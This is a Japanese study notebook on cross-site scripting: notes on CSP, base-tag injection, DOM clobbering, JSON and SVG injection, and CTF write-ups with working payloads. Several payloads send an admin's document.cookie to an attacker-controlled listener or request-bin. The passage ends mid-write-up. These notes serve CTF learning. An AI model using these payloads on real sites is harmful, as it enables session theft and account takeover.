<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [XSS](#xss)
  - [CSP](#csp)
    - [CSP Level](#csp-level)
    - [default-src](#default-src)
    - [script-src](#script-src)
    - [strict-dynamic (level 3)](#strict-dynamic-level-3)
  - [Base Tag Injection](#base-tag-injection)
  - [DOM clobbering](#dom-clobbering)
  - [JSON Injection](#json-injection)
  - [CSS Injection](#css-injection)
- [writeup](#writeup)
  - [Reflect / JSON Injection (CONFidence 2020 Teaser)](#reflect--json-injection-confidence-2020-teaser)
  - [CSP nonce strict-dynamic / DOM clobbering / BaseTag Injection (SECCON beginnres 2020 somen)](#csp-nonce-strict-dynamic--dom-clobbering--basetag-injection-seccon-beginnres-2020-somen)
  - [Reflected (SECCON beginners 2018 Gimme your comment)](#reflected-seccon-beginners-2018-gimme-your-comment)
  - [Reflect / BaseTag Injection / force scraping fake Form (SECCON beginners 2018 Gimme your comment REVENGE)](#reflect--basetag-injection--force-scraping-fake-form-seccon-beginners-2018-gimme-your-comment-revenge)
  - [Reflected / Get Admin's Cookie through bypass "." (33C3 CTF )](#reflected--get-admins-cookie-through-bypass--33c3-ctf-)
  - [Base tag Injection / CSP bypass / DOM clobbering (BugPoC XSS CTF November 2020)](#base-tag-injection--csp-bypass--dom-clobbering-bugpoc-xss-ctf-november-2020)
  - [CSS Injection (SECCON 2018 Online GhostKingdom)](#css-injection-seccon-2018-online-ghostkingdom)
  - [DOM clobbering / CSP bypass in meta tag / jQuery before 3.0.0 (Midnight Sun CTF 2019 Finals Marcololo)](#dom-clobbering--csp-bypass-in-meta-tag--jquery-before-300-midnight-sun-ctf-2019-finals-marcololo)
  - [bypass with HTML entity, ES6 unicode / DOM clobbering / iframe (Security Fest 2019 CTF, entropian)](#bypass-with-html-entity-es6-unicode--dom-clobbering--iframe-security-fest-2019-ctf-entropian)
  - [XSS in title form / bypass blacklist \<script> (HackerOne CTF：Micro-CMS v1)](#xss-in-title-form--bypass-blacklist-%5Cscript-hackerone-ctfmicro-cms-v1)
  - [bypass addslashes() with %bf%5c$22 / Prototype Polution (PBCTF 2020 - Ikea Name Generator)](#bypass-addslashes-with-22--prototype-polution-pbctf-2020---ikea-name-generator)
  - [Stored XSS in User-Agent Referer / SQL Injection / (Tips for bug bounty beginners from a real life experience)](#stored-xss-in-user-agent-referer--sql-injection--tips-for-bug-bounty-beginners-from-a-real-life-experience)
  - [eval Injection / overwrite function with eval (calc -> alert,eval) (Intigriti's December XSS Challenge 2020)](#eval-injection--overwrite-function-with-eval-calc---alerteval-intigritis-december-xss-challenge-2020)
  - [SVG image XSS / XSS chain / bypass Markdown / BootStrap before 4.1.2(CVE-2018-14041) (CTFZone 2019 Quals - Shop Task)](#svg-image-xss--xss-chain--bypass-markdown--bootstrap-before-412cve-2018-14041-ctfzone-2019-quals---shop-task)
  - [SVG image XSS (CONFidence CTF 2019)](#svg-image-xss-confidence-ctf-2019)
  - [](#)
  - [](#-1)
  - [CSS Injection / Self Injection / Header Injection / Command Injection (Google CTF Cat Chat)](#css-injection--self-injection--header-injection--command-injection-google-ctf-cat-chat)
  - [bypass XSS Auditor (ISITDTU CTF 2019 Quals Writeup - XSSgame1)](#bypass-xss-auditor-isitdtu-ctf-2019-quals-writeup---xssgame1)
  - [CSS Injection (TSG CTF BADNONCE Part 1)](#css-injection-tsg-ctf-badnonce-part-1)
  - [XSS-unsafe jQuery plugins (GitHub Security Lab CTF 3:)](#xss-unsafe-jquery-plugins-github-security-lab-ctf-3)
  - [](#-2)
- [Docker環境があるやつ](#docker%E7%92%B0%E5%A2%83%E3%81%8C%E3%81%82%E3%82%8B%E3%82%84%E3%81%A4)
  - [somen (SECCON beginners 2020)](#somen-seccon-beginners-2020)
- [練習](#%E7%B7%B4%E7%BF%92)
  - [xsssample](#xsssample)
    - [1 (normal)](#1-normal)
    - [2 (bypass <input )](#2-bypass-input-)
    - [3 (bypass maxlength="10")](#3-bypass-maxlength10)
    - [4 (bypass "<>")](#4-bypass-)
    - [5 (bypass maxlength="10" with POST)](#5-bypass-maxlength10-with-post)
    - [6 (href javascript:)](#6-href-javascript)
    - [7 (filter "script")](#7-filter-script)
    - [8 (inject in document.write(''))](#8-inject-in-documentwrite)
    - [11 (inject \<input value="">)](#11-inject-%5Cinput-value)
    - [12 (\<meta content=""/>)](#12-%5Cmeta-content)
    - [13 (IE only)](#13-ie-only)
    - [14 (filter ?)](#14-filter-)
    - [15 (???)](#15-)
  - [XSS Challenges](#xss-challenges)
    - [1 (normal)](#1-normal-1)
    - [2 (bypass \<input value="">)](#2-bypass-%5Cinput-value)
    - [3 (inject \<select>tag)](#3-inject-%5Cselecttag)
    - [4 (bypas \<input type="hidden" value="">)](#4-bypas-%5Cinput-typehidden-value)
    - [5 (bypass maxlength="15")](#5-bypass-maxlength15)
    - [6 (fileter "<>")](#6-fileter-)
    - [7 (inject \<input value= > with no quote)](#7-inject-%5Cinput-value--with-no-quote)
    - [8 (href)](#8-href)
    - [9 (UTF-7 XSS)](#9-utf-7-xss)
    - [10 (filter "domain")](#10-filter-domain)
    - [11 ページが動いてない…](#11-%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%8C%E5%8B%95%E3%81%84%E3%81%A6%E3%81%AA%E3%81%84)
    - [12 IE](#12-ie)
    - [13 IE](#13-ie)
    - [14 IE](#14-ie)
    - [15 (DOM based document.write)](#15-dom-based-documentwrite)
    - [16 ページが動いてない](#16-%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%8C%E5%8B%95%E3%81%84%E3%81%A6%E3%81%AA%E3%81%84)
    - [17 IE](#17-ie)
    - [18 IE](#18-ie)
    - [19 ページが動いてない](#19-%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%8C%E5%8B%95%E3%81%84%E3%81%A6%E3%81%AA%E3%81%84)
  - [DomGoat](#domgoat)
    - [1 (location.hash -> .innerHTML)](#1-locationhash---innerhtml)
    - [2 (document.referer -> .innerHTML)](#2-documentreferer---innerhtml)
    - [3 (XHR JSON -> .innerHTML)](#3-xhr-json---innerhtml)
    - [4 (WebSocket JSON -> .innerHTML)](#4-websocket-json---innerhtml)
    - [5 (frames[0].postMessage -> window.parent.postMessage -> .innerHTML)](#5-frames0postmessage---windowparentpostmessage---innerhtml)
    - [6 (localStorage.setItem() -> localStorage.getItem() -> .innerHTML)](#6-localstoragesetitem---localstoragegetitem---innerhtml)
    - [7 (inject href in <a tag with onmouseover=alert(1))](#7-inject-href-in-a-tag-with-onmouseoveralert1)
    - [8 (inject href in <a tag with onmouseover=alert(1))](#8-inject-href-in-a-tag-with-onmouseoveralert1)
    - [9 (javascript:alert(1) in \<a tag href="\<inject>")](#9-javascriptalert1-in-%5Ca-tag-href%5Cinject)
    - [10 (javascript:alert(1) in \<a tag href="\<inject>")](#10-javascriptalert1-in-%5Ca-tag-href%5Cinject)
  - [動作環境ナシ](#%E5%8B%95%E4%BD%9C%E7%92%B0%E5%A2%83%E3%83%8A%E3%82%B7)
    - [XSS Challenge(セキュリティ・ミニキャンプ in 岡山 2018)](#xss-challenge%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97-in-%E5%B2%A1%E5%B1%B1-2018)
    - [katagaitaiCTF&#035;9 xss千本ノック](#katagaitaictf9-xss%E5%8D%83%E6%9C%AC%E3%83%8E%E3%83%83%E3%82%AF)
- [メモ](#%E3%83%A1%E3%83%A2)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->
# XSS
## CSP
### CSP Level
CSP Level 3の strict-dynamic をサポートしているブラウザでは nonce-{random} 'unsafe-eval' 'strict-dynamic' のみ解釈され、その他は無視される。   
CSP Level 2までのみサポートしているブラウザでは 'nonce-{random}' 'unsafe-eval' のみ解釈され、その他は無視   
CSP Level 1のみサポートしているブラウザでは 'unsafe-inline' 'unsafe-eval' https: http:; のみ解釈され、その他は無視   
### default-src
未指定の-srcディレクティブの大半に対してデフォルトを定義する。   
デフォルトでインラインコードとeval()は有害とみなす   
'unsafe-inline' もしくは 'unsafe-eval'で明示的に有効化する必要がある   
`default-src 'none'`ですべて無効化し、全ての読み込みを制限。(ただし`default-src 'none' img-src 'self'`とすればimgは現在のオリジンと一致すれば許可、みたいになる)   

### script-src 
ホワイトリストによって、jsファイルを読み込めるドメインを制限する。ただしコールバック関数を呼びだしできるJSONPエンドポイントを使用すればCSPをバイパスできるのでよくないらしい   
https://inside.pixiv.blog/kobo/5137   
https://csp-evaluator.withgoogle.com/   
ここにCSPの設定を投げると、危険性を評価してくれる。超便利。   
`'unsafe-inline'`がない限りはインラインスクリプトの実行を制限。   
インラインスクリプトは`<script>`とか`<img onerro=alert>`とかのイベントハンドラ内のインラインとか。   
https://qiita.com/zabu/items/d2fbac1abc81eba38efb   
nonceはlevel2から存在する。nonceまたはホワイトリストがあれば実行を許可ってことかな？(strict-dynamicではnonceだけで許可)？   
### strict-dynamic (level 3)
https://inside.pixiv.blog/kobo/5137   
`'strict-dynamic'`によってnonceによるscriptの実行制御が強制される ( script-src にドメインのホワイトリストを書いても無視される)。   
nonceにより実行を許可されたscriptから動的に生成された別のscriptも実行が許可されるようになる。   
https://masatokinugawa.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html   
non-"parser-inserted" なスクリプト要素は、スクリプトを使ってロードすることが許可される。   
parser-insertedとはDocumentのパーサーが生成した（HTMLに書いてあった、もしくはdocument.writeで出力した）かどうか。   
```js
<script nonce="????">
//これはロードされる
var script=document.createElement('script');
script.src='//example.org/dependency.js';
document.body.appendChild(script);
// <script id="aaa"></script>のような場合は実行可能
document.getElementById("aaa").innerHTML = "alert(1);"

//これはロードされない document.write()を使って書くとダメ
document.write("<scr"+"ipt src='//example.org/dependency.js'></scr"+"ipt>");
// <div id="aaa"></div>の場合はimgを挿入しても実行不可能
document.getElementById("aaa").innerHTML = "<img src=/ onerror=alert(1)>"
</script>
```
## Base Tag Injection
以下を挿入すれば基底URLを変更できる。   
```txt
<base href="http://hoge.example">
```
CSPが設定されている場合は以下で検知できるかも(script-srcがあれば)。   
https://csp-evaluator.withgoogle.com/   
CSPが`default-src 'none'`だとしてもformの送信先も変えられる！！！！！   

## DOM clobbering
タグに同じid名を付与すれば、もともと`<div id="a">`に`document.getElementById("a").innerHTML`で代入していても、`<script id="a">`を挿入することでこっちにJavascriptを要素の値として挿入して実行できる！   
- 参考   
https://portswigger.net/web-security/dom-based/dom-clobbering   
https://diary.shift-js.info/dom-clobbering/   
http://www.thespanner.co.uk/2013/05/16/dom-clobbering/   

- 例題   
https://github.com/SECCON/Beginners_CTF_2020/blob/master/web/somen/writeup.md   
https://masatokinugawa.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html   
https://szarny.hatenablog.com/entry/2019/01/01/XSS_Challenge_%28%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97_in_%E5%B2%A1%E5%B1%B1_2018_%E6%BC%94%E7%BF%92%E3%82%B3%E3%83%B3#Case-23-nonce--strict-dynamic   
http://akouryy.hatenablog.jp/entry/ctf/xss.shift-js.info#23-   

## JSON Injection
```js
// この実装は脆弱！key1の値を上書きできる！
dataStr = "value2', 'key1':'fake_value1";
jsonStr = "{'key1':'value1', 'key2':'" + dataStr + "'}";
console.log(jsonStr);  // {'key1':'value1', 'key2':'value2', 'key1':'fake_value1'}

// こっちだとsecure???
dataStr = "'value2', key1:'fake_value1'";
temp_obj = {'key1':'value1', 'key2': dataStr};
console.log(temp_obj); // { key1: 'value1', key2: "'value2', key1:'fake_value1'" }
jsonStr = JSON.stringify(temp_obj);
console.log(jsonStr);  // {"key1":"value1","key2":"'value2', key1:'fake_value1'"}
```
https://www.calc.mie.jp/posts/2017-12-26-json-injection.html   

## CSS Injection
以下参照。   
https://diary.shift-js.info/css-injection/   
JSじゃなくて任意のCSSを埋め込めるときに使えそう。   

## XSS with image (ex. SVG mbep jpg)
SVG画像はXML形式なため、Javascriptを以下のように埋め込める。  
upload先の画像を使うのでCSPが`script-src 'self'`となって自分のドメイン内からしかJavascriptを実行できない場合にCSPをバイパスできる。  
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve">  
   <script>
      alert("svg");
   </script>
<image id="image0" width="100" height="100" x="0" y="0"
    href="" />
</svg>
```
これで、`http://example.com/evil.svg`にアクセスすれば`evil.svg`内のJavascriptを実行できる。  
また、`http://example.com/index.html`内の`<iframe src=/evil.svg>`,`<embed src=/evil.svg>`で`evil.svg`内のJavascriptを実行できる。  
`<script src=/evil.svg>`,`<img src=/evil.svg>`,`<object src=/evil.svg>`ではJavascriptは実行されなかった…  
http://cocu.hatenablog.com/entry/2013/12/23/033137  
ここにも同様の実験がされてるが、結果が違うぞ…？？？  
  
基本的にSVGでのXSSの問題は、何らかの画像ファイルがアップロードできて、その画像のURLをAdminのクローラに踏ませることでSVG内のJavascriptを実行する。  
  
SVG画像以外をXSSに使用する場合は、`.webp`,`jpg`などがあるっぽい？  
基本的にこれらの画像ファイルをアップロードして、そのURLにアクセスすると`Content-Type: image/png`などのContent typeがサーバーに返され、ブラウザがこれをHTMLとしてではなく画像ファイルとして認識してHTMLで解釈せず画像ファイルとして開こうとするため、画像ファイルの中にJavaScriptを挿入していても実行は(基本的に)できない。  
  
ただサーバー側の設定で、中身がJavaScriptの`alert.png`ファイルを、中身だけからContent typeを`application/javascript`として認識して返す場合には、ブラウザにはJavaScriptとして渡されるためJavaScriptを実行できる。  
  
また、サーバー側でContent typeを判断できずに何も返さない場合、ブラウザ側でそのファイルをどう扱うかを判断する必要がありそこでJavaScriptとして認識して実行することになる可能性がある。`.webp`はこれ？  
なので、基本的には、中身がJavaScriptの`alert.png`などを送信してContent typeを見て、`image/`がセットされていないものを探す？  
アップロードしたURLが`/<Username>/upload`みたいな感じで拡張子を持たない場合は、Content typeが`application/octet-stream`となる場合は、`<script src=http://.../<username>/upload>`みたいにしてJavascriptを実行できる？？  
  
JavaScriptが埋め込まれたjpgファイルはここにある。  
https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs  

# writeup
## Reflect / JSON Injection (CONFidence 2020 Teaser)
https://www.gem-love.com/ctf/2019.html   
- **entrypoint**   
http://catweb.zajebistyc.tf/   
ここでまだ動いてる。   
`<script>`タグ内で`newDiv.innerHTML = '<img style="max-width: 200px; max-height: 200px" src="static/'+kind+'/'+cat+'" />';`としてJSONで返ってきたデータをimgタグ内に挿入している。ここでReflect XSSできる！   
ちなみに、Directry Traversalもできる！   
- **概要**   
以下の通り、`/cats?kind=black`とかでリクエストを送信すると、JSONデータが返ってきてそれを`<img>`タグ内に挿入している。   
```html
<html>
	<head>
		<title>My cats</title>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script>
		function getNewCats(kind) {
			$.getJSON('http://catweb.zajebistyc.tf/cats?kind='+kind, function(data) {
				if(data.status != 'ok')
				{
					return;
				}
				$('#cats_container').empty();
				cats = data.content;
				cats.forEach(function(cat) {
					var newDiv = document.createElement('div');
					newDiv.innerHTML = '<img style="max-width: 200px; max-height: 200px" src="static/'+kind+'/'+cat+'" />';
					$('#cats_container').append(newDiv);
				});
			});

		}
		$(document).ready(function() {
			$('#cat_select').change(function() {
				var kind = $(this).val();
				history.pushState({}, '', '?'+kind)
				getNewCats(kind);
			});
			var kind = window.location.search.substring(1);
			if(kind == "")
			{
				kind = 'black';
			}
			getNewCats(kind);
		});
	</script>
	</head>
	<body>
		<select id="cat_select">
			<option value="black">black</option>
			<option value="grey">grey</option>
			<option value="red">red</option>
			<option value="white">white</option>
		</select>
		<div id="cats_container"></div>
		not like sumthing? send it <a href="/report">hier</a>
	</body>
</html>
```
返ってくるJSONは以下の通り。   
```txt
{
"status": "ok",
"content": ["2468b5d0-67e8-4d77-9bbb-87a656c8087a-large3x4_Untitledcollage.jpg", "24.jpg", "il_570xN.1285759626_8j8m.jpg"]
}
```
これを取得して以下のようなHTMLをJavascriptで生成する。   
なので、`kind`,`cat`のいずれかで`onerror=alert(1);`みたいな感じでやりたい。   
```html
<div id="cats_container">
	<div>
		<img style="max-width: 200px; max-height: 200px" src="static/black/2468b5d0-67e8-4d77-9bbb-87a656c8087a-large3x4_Untitledcollage.jpg">
	</div>
```
しかし、`kind=black`のかわりに`black=aaa`みたいな存在しないっぽいものを投げるとJSONでstats errorとなって、`<img>`を挿入せずに`return`してしまう。   
```txt
cats?kind="/>';alert(1);//"
{"status": "error", "content": ""/>';alert(1);//" could not be found"}
```
ここで、入力がJSONの中に入っているので、JSON Injectionによって`"status":"OK"`をあらかじめ入れておくことでstatusのチェックをバイパスする。   
```txt
// これを投げる。
kind=", "status": "ok", "content": ["1554866661126960529.jpg", "lJCNA_JC_400x400.jpg", "1.jpg", "1548178639131425422.jpg"], "test":"

// これはいかのようになり、status=okで上書きされるので結果はerrorではなくOKとなる！
{"status": "error", "content": "", "status": "ok", "content": ["1554866661126960529.jpg", "lJCNA_JC_400x400.jpg", "1.jpg", "1548178639131425422.jpg"], "test":" could not be found"}
```
次は`onerror=alert`とかを挿入したい。`<img src=".....aa" onerror="alert(1);">`のようにしたいので以下を送信するとJSONの構文が壊れてエラーとなる。   
```txt
//　これを送信
", "status": "ok", "content": ["y1ng" onerror="alert('y1ng')"], "test":"

// SyntaxError: JSON.parse: expected ',' or ']' after array element at line 1 column 71 of the JSON data
{"status": "error", "content": "", "status": "ok", "content": ["y1ng" onerror="alert('y1ng')"], "test":" could not be found"}
```
なので、"\"をダブルクオートの前に挿入してやればよい。   
```txt
", "status": "ok", "content": ["y1ng\" onerror=\"alert('y1ng')"], "test":"

{"status": "error", "content": "", "status": "ok", "content": ["y1ng\" onerror=\"alert('y1ng')"], "test":" could not be found"}
```
これで以下のようにHTMLが生成され、XSSが達成できる！   
```html
<img style="max-width: 200px; max-height: 200px" src="static/%22,%20%22status%22:%20%22ok%22,%20%22content%22:%20[%22y1ng\%22%20onerror=\%22alert(%27y1ng%27)%22],%20%22test%22:%22/y1ng" onerror="alert('y1ng')">
```
- **Payload**   
```txt
http://catweb.zajebistyc.tf/?%22,%20%22status%22:%20%22ok%22,%20%22content%22:%20[%22y1ng\%22%20onerror=\%22alert(%27y1ng%27)%22],%20%22test%22:%22
```
また、実は以下でDirectry Traversalができる。つまり、`kind=black`のblackはディレクトリ名だった！   
```txt
kind=.
{"status": "ok", "content": ["grey", "black", "white", "red"]}

kind=../
{"status": "ok", "content": ["uwsgi.ini", "prestart.sh", "main.py", "templates", "static", "app.py"]}

kind=../templates/
{"status": "ok", "content": ["index.html", "report.html", "flag.txt"]}
```
## CSP nonce strict-dynamic / DOM clobbering / BaseTag Injection (SECCON beginnres 2020 somen)
https://github.com/SECCON/Beginners_CTF_2020/blob/master/web/somen/writeup.md   
https://www.ryotosaito.com/blog/?p=474   
https://diary.shift-js.info/seccon-beginners-ctf-2020/   

- **entrypoint**   
`<title>Best somen for <?= isset($_GET["username"]) ? $_GET["username"] : "You" ?></title>`にReflect XSSがあることがわかる。   
また、``document.getElementById("message").innerHTML = `${username}, I recommend ${adjective} somen for you.`;``にDOM based XSSがあることがわかる。   
また、CSPが以下のように設定されているので、単に`<script>alert(1)</script>`を挿入するだけではだめ。   
`default-src 'none'`なので、すべての読み込みを制限(ただしそのあとにscript-srcがあるのでscriptの読み込みは限定で許可)   
`script-src`に`nonce`と`sha256...`のハッシュがあるので、`nonce`がセットされているまたはintegrityにsha256のハッシュがセットされている`<script>`しか実行できない。   
```txt
Content-Security-Policy: default-src 'none'; script-src 'nonce-WuUfK2ztXY/KcshKy90o8SGykbs=' 'strict-dynamic' 'sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A='
```
したがって、nonceのセットされている元々ある`<script>`内でDOM basedにより任意のJavascriptを生成する必要があることがわかる。ただし`.innerHTML`経由では`<script>`タグを挿入することはできない！！！！！！！！！！      
nonceのある`<script>`から動的に生成されるnonceのない`<script>`は実行権限が継承されて実行可能となる。nonceのない`<script id="a">`に`document.getElementById("a").innerHTML` に値を代入する形とかなら継承される。     

- **概要**   
![image](https://user-images.githubusercontent.com/56021519/103155489-da447580-47e3-11eb-8fae-4406597cd176.png)   
上のフォームから入力すると、JSに入力される。下のフォームから入力するとAdminが`/?username=test`みたいにアクセスしてくれる。   
**index.php**   
```php
<?php
$nonce = base64_encode(random_bytes(20));
header("Content-Security-Policy: default-src 'none'; script-src 'nonce-${nonce}' 'strict-dynamic' 'sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A='");
?>

<head>
    <title>Best somen for <?= isset($_GET["username"]) ? $_GET["username"] : "You" ?></title>

    <script src="/security.js" integrity="sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A="></script>
    <script nonce="<?= $nonce ?>">
        const choice = l => l[Math.floor(Math.random() * l.length)];

        window.onload = () => {
            const username = new URL(location).searchParams.get("username");
            const adjective = choice(["Nagashi", "Hiyashi"]);
            if (username !== null)
                document.getElementById("message").innerHTML = `${username}, I recommend ${adjective} somen for you.`;
        }
    </script>
</head>

<body>
    <h1>Best somen for You</h1>

    <p>Please input your name. You can use only alphabets and digits.</p>
    <p>This page works fine with latest Google Chrome / Chromium. We won't support other browsers :P</p>
    <p id="message"></p>
    <form action="/" method="GET">
        <input type="text" name="username" place="Your name"></input>
        <button type="submit">Ask</button>
    </form>
    <hr>

    <p> If your name causes suspicious behavior, please tell me that from the following form. Admin will acceess /?username=${encodeURIComponent(your input)} and see what happens.</p>
    <form action="/inquiry" method="POST">
        <input type="text" name="username" place="Your name"></input>
        <button type="submit">Ask</button>
    </form>

</body>
```
**worker.js**   
これはGUI無しのブラウザみたいなのでNode.js上で動作する。`crawl`でAdminのCookieを保持した状態で、index.phpの下のフォームから入力されたusernameの値を使って`/?username=${encodeURIComponent(username)}`でアクセスしてくれる。   
つまり、下のフォームからAdmin用のクローラに送信するusernameの値をなんやかんやしてXSSを発生されて攻撃者サーバーにCookieを送信させるのが目標。   
```js
const puppeteer = require('puppeteer');
const Redis = require('ioredis');
const connection = new Redis(6379, 'redis');

const crawl = async (username) => {
    // initialize
    const browser = await puppeteer.launch({
        executablePath: 'google-chrome-unstable',
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-background-networking',
            '--disk-cache-dir=/dev/null',
            '--disable-default-apps',
            '--disable-extensions',
            '--disable-gpu',
            '--disable-sync',
            '--disable-translate',
            '--hide-scrollbars',
            '--metrics-recording-only',
            '--mute-audio',
            '--no-first-run',
            '--safebrowsing-disable-auto-update',
        ],
    });
    const page = await browser.newPage();

    // set cookie
    await page.setCookie({
        name: 'flag',
        value: process.env.FLAG,
        domain: process.env.DOMAIN,
        expires: Date.now() / 1000 + 10,
    });

    // access
    const url = `${process.env.SCHEME}://${process.env.DOMAIN}/?username=${encodeURIComponent(username)}`;
    try {
        await page.goto(url, {
            waitUntil: 'networkidle0',
            timeout: 5000,
        });
    } catch (err) {
        console.log(err);
    }

    // finalize
    await page.close();
    await browser.close();
};

(async () => {
    while (true) {
        console.log("[*] waiting new query ...");
        await connection.blpop("query", 0).then(v => {
            const username = v[1];
            console.log(`[*] started: ${username}`);
            return crawl(username);
        }).then(() => {
            console.log(`[*] finished.`)
            return connection.incr("proceeded_count");
        }).catch(e => {
            console.log(e);
        });
    };
})();
```
`document.getElementById("message").innerHTML`で`<p id="message"></p>`内に挿入される。   
innerHTMLでは`<script>`を埋め込むことはできない。   
https://ja.stackoverflow.com/questions/2756/innerhtml%E3%81%AB%E5%85%A5%E3%82%8C%E3%81%9F%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AE%E4%B8%AD%E3%81%ABscript%E3%82%BF%E3%82%B0%E3%81%8C%E3%81%82%E3%81%A3%E3%81%A6%E3%82%82%E5%AE%9F%E8%A1%8C%E3%81%95%E3%82%8C%E3%81%AA%E3%81%84%E3%81%AE%E3%81%AF%E3%81%AA%E3%81%9C   
しかし、`<script id="message">`を一つ目のReflected XSSで挿入すると、後ろの`<p id="message">`の代わりに挿入した`<script id="message">`にinnerHTMLに実行権限付きでJSが値として代入されてCSPをバイパスして実行できる！！？！？？！？   
このように元々あるidと同じ名前のidを持つformとかscriptタグを挿入することで、挿入した方のタグが適応されてしまう手法をDOM clobberingというのかな？？   
   

また、`security.js`によって`username`パラメータの値には記号を含められないようになっているが、これはBase tag Injectionという`<base>`タグを挿入して基底URLを定義することでバイパスできる！   
`<base href="http://hoge.example">`を挿入すれば、`src=/security.js`は`hoge.example/security.js`となってロードが失敗して制限をバイパスできる。   
ちなみに、以下のCSP-Evaluatorを使用すればBase tag Injectionできることがわかる！   
https://csp-evaluator.withgoogle.com/   
![image](https://user-images.githubusercontent.com/56021519/103156841-63fa4000-47f0-11eb-9663-e71256d876f2.png)   
- **Payload**   
Docker環境ではIPアドレスが到達できなかったりするので、worker.jsを編集して`192.168.99.100`とかを直書きしている。   
```txt
// これを下のフォームのAdminクローラにPOSTする
document.location=`http://192.168.99.1:4444/?q=${encodeURIComponent(document.cookie)}`;//</title><script id="message"></script><base href="http://hoge.example">

// WSLでListenする
192.168.99.100 - - [26/Dec/2020 21:41:56] "GET /?q=flag%3Dtest%7Bflag%7D HTTP/1.1" 200 -
```
- **ほぼ同じ類題**   
https://szarny.hatenablog.com/entry/2019/01/01/XSS_Challenge_%28%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97_in_%E5%B2%A1%E5%B1%B1_2018_%E6%BC%94%E7%BF%92%E3%82%B3%E3%83%B3#Case-23-nonce--strict-dynamic   
http://akouryy.hatenablog.jp/entry/ctf/xss.shift-js.info#23-   

## Reflected (SECCON beginners 2018 Gimme your comment)
https://graneed.hatenablog.com/entry/2018/05/27/165740   
https://tech.kusuwada.com/entry/2018/05/31/011755   
- **entrypoint**   
`新規投稿`ボタンを押して入力する`タイトル`と`本文`のうち、本文にXSSの脆弱性があるらしい。   
User-Agentにフラグがあるらしい。   
どうやら投稿ページにだけクローラが動いていて、ユーザーが何らかのデータを送信すると、そのクローラも同じくその値を使って投稿ページにアクセスするっぽい？？(そうじゃないとサーバーのUser-Agentゲットできないし…)   
- **概要**   
https://tech.kusuwada.com/entry/2018/05/31/011755   
にある通り、以下のBeeceptorというツールでグローバルなエンドポイントを簡単に作成できるらしい。   
https://beeceptor.com/   
- **Payload**   
以下を送信してUser-Agentを得る。   
```txt
<script>location.href="http://<myserver>/1g993rc1"</script>
```
## Reflect / BaseTag Injection / force scraping fake Form (SECCON beginners 2018 Gimme your comment REVENGE)
https://graneed.hatenablog.com/entry/2018/05/27/170036   
https://tech.kusuwada.com/entry/2018/05/31/011755   

- **entrypoint**   
上記と同じ個所にXSSの脆弱性があるが、今度はCSPが`Content-Security-Policy: default-src 'self'`となっており、同一オリジン内からしか読み込めないようになっている。   
- **概要**   
相対URLで書かれているのでBase Tag Injectionが可能！！！   
また、クローラが以下のようにしてフォームが送信されたかどうかを確認して同様の操作を再現しているが、フォームなら何でも良さそうなので攻撃者サーバーに送信する偽のフォームをセットすれば、そのフォームからの送信を再現して、攻撃者サーバーにアクセスしてくれる！   
```txt
await page.click('button[type=submit]');
```
```html
<form method="post" action="http://{作成したエンドポイント}">
  <input type="text" name="dummy_form">
  <button type="submit">ダミーボタンだよ</button>
</form>
```
- **Payload**   
```html
<base href = "http://myserver/" />
```
```html
<form method="post" action="http://{作成したエンドポイント}">
  <input type="text" name="dummy_form">
  <button type="submit">ダミーボタンだよ</button>
</form>
```
## Reflected / Get Admin's Cookie through bypass "." (33C3 CTF )
https://ctftime.org/writeup/5211   
https://kimiyuki.net/writeup/ctf/2016/33c3-ctf-yoso/   
- **entrypoint**   
- アクセスできるファイル   
   - `/register.php//login.php/logout.php`: 何もなさそう   
   - `/search.php`: 検索ができる   
   - `/bookmark.php`: POSTすればzipが鯖上に生成される   
   - `/download.php`: そのzipを削除しつつ取得   
   - `/feedback.php`: linkを送るとAdminが鯖上で踏んでjsを実行してくれる   
`download.php`にReflected XSSの脆弱性があるらしい。Adminにリンクを送信して踏ませることができるので、XSSによる任意のJSをAdminにこの通信上で実行させることができる！   
`/feedback.php`で攻撃者サーバーにアクセスさせて、`document.cookie`をするJSを実行させても、攻撃者サーバーとの通信間ではCookieは当然ながら存在しないので何も得られない。   
対象サーバー上のXSSによるJSを実行すれば、AdminのCookieを得られる！   
AdminのCookieを得て攻撃者サーバーに送信させるか、もしくはAdminしかアクセスできないflag.zipをXMLHttpRequestでゲットしてそれを攻撃者サーバーに送信させる方法がある。   
前者の方が楽。   
   
- **概要**   
以下のようにしてCookieを送信させたいが、`.`が消去されてしまうらしい。  
```txt
location.href = "http://requestb.in/18o1k6g1?" + document.cookie;
```
以下のようにしてバイパスできる。   
```txt
// "."を"\x2e"としてevalする
